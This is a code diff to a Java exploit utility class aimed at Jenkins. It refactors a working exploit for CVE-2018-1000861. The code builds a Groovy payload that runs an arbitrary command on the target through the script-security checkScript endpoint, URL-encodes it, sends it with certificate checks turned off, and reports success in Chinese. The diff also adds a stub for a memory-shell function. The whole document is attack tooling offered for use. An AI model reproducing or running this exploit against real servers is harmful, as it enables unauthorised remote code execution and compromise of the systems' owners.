@@ -13,22 +13,30 @@ public class JenkinsCommonsUtils {
         return send.statusCode() == 200;
     }
 
-    public static String CVE_2018_1000861Exploit(String addr, String command){
-        final String vulPath = "http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript\n" +
+    public static String CVE_2018_1000861GeneratePayload(String addr,String payload){
+        final String vulPath = "securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript" +
                 "?sandbox=true" +
                 "&value=";
+        return addr + vulPath + URLEncoder.encode(payload);
+    }
 
+
+    public static String CVE_2018_1000861Exploit(String addr, String command){
         final String payload = "=public class x {" +
-                "  public x(){" +
-                "    \""+command+"\".execute()" +
-                "  }" +
+                "public x(){" +
+                "\""+command+"\".execute()" +
+                "}" +
                 "}";
-        final String address = addr + vulPath + URLEncoder.encode(payload);
+        String address = JenkinsCommonsUtils.CVE_2018_1000861GeneratePayload(addr, payload);
         try {
             Requests.get(address).verify(false).send();
             return "发送成功";
         }catch (Exception e){
             return "发送失败";
         }
+    }
+
+    public static String CVE_2018_1000861Memshell(String addr, String command){
+        return "1";
     }
 }
